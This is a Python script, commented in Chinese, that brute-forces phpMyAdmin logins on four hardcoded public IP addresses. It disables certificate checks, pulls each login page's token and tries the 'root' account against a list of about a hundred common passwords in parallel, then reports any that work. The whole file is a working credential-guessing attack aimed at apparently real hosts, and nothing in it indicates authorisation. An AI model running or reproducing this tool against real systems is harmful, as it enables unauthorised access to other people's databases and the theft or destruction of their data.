#!/usr/bin/env python3
"""大字典爆破4个已确认phpMyAdmin"""
import urllib.request, http.cookiejar, ssl, re, sys, time
from concurrent.futures import ThreadPoolExecutor

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE

targets = [
    ("154.8.182.214", "80"),
    ("47.105.218.154", "8980"),
    ("39.105.7.208", "8980"),
    ("60.191.221.198", "8980"),
]

pwds = ["123456","root","admin","12345678","mysql","root123","password","123456789",
        "admin123","test","phpstudy","phpStudy","12345","1234567","888888","111111",
        "000000","admin888","mysql123","passw0rd","abc123","123123","654321",
        "1234567890","qwerty","p@ssw0rd","P@ssw0rd","admin@123","www123","web123",
        "phpmyadmin","pma","xm123456","123456a","Aa123456","a123456","zxcvbnm",
        "qazwsx","123456789a","admin2018","admin2019","admin2020","admin2021",
        "admin2022","admin2023","admin2024","admin2025","admin2026","woaini",
        "5201314","qq123456","gyyyh","root@123","Root123","root123456","MySQL@123",
        "mysql123456","1234567890a","admin@2024","Admin@123","admin8888","root888",
        "88888888","666666","00000000","147258369","987654321","asd123","asd123456",
        "qwe123","qwe123456","zxc123","159357","123qwe","abc123456","iloveyou",
        "wang123","li123","zhang123","chen123","test123","test123456","demo","demo123",
        "guest","guest123","sa123456","sasa","xiaoming","xiaohong","doudou",
        "123456789.com","www.123456","web123456","server123","mysql1234","data123"]

def try_login(ip, port, user, pw):
    for attempt in range(2):
        try:
            cj = http.cookiejar.CookieJar()
            op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), urllib.request.HTTPSHandler(context=ctx))
            op.addheaders = [("User-Agent","Mozilla/5.0")]
            base = f"http://{ip}:{port}/phpmyadmin/"
            r = op.open(base, timeout=6)
            html = r.read().decode("utf-8","ignore")
            m = re.search(r'name="token" value="([a-f0-9]{32})"', html)
            if not m: return "NOTOKEN"
            data = f"pma_username={user}&pma_password={pw}&server=1&token={m.group(1)}".encode()
            op.open(urllib.request.Request(f"{base}index.php", data=data), timeout=6).read()
            r = op.open(f"{base}index.php", timeout=6)
            body = r.read().decode("utf-8","ignore")
            if "Cannot log in" in body or "#1045" in body:
                return "FAIL"
            if "logout" in body or "navigation" in body or "server_databases" in body:
                return "SUCCESS"
            return "UNKNOWN"
        except Exception as e:
            if attempt == 1: return "ERR"
            time.sleep(1)
    return "ERR"

def brute(target):
    ip, port = target
    for pw in pwds:
        r = try_login(ip, port, "root", pw)
        if r == "SUCCESS":
            return f"!!! {ip}:{port} root/{pw} 登录成功!"
    return f"{ip}:{port} 无命中"

with ThreadPoolExecutor(4) as ex:
    for r in ex.map(brute, targets):
        print(r, flush=True)
print("DONE")
